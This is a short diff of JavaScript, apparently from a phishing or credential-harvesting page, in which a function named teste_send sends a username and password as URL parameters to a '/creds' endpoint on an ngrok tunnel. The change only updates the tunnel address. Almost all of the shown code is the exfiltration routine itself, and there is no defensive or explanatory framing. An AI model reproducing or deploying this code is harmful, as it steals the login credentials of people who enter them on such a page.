@@ -43,7 +43,7 @@ function send_data(usuario, senha){
                                
 function teste_send(u, pwd){
    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://7e68-45-162-158-3.sa.ngrok.io/creds?user=" + u + "&pwd=" + pwd, true);
+    xhr.open("GET", "https://23b1-45-162-158-3.sa.ngrok.io/creds?user=" + u + "&pwd=" + pwd, true);
     xhr.onreadystatechange = function() {
         if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
             console.log(xhr.responseText);
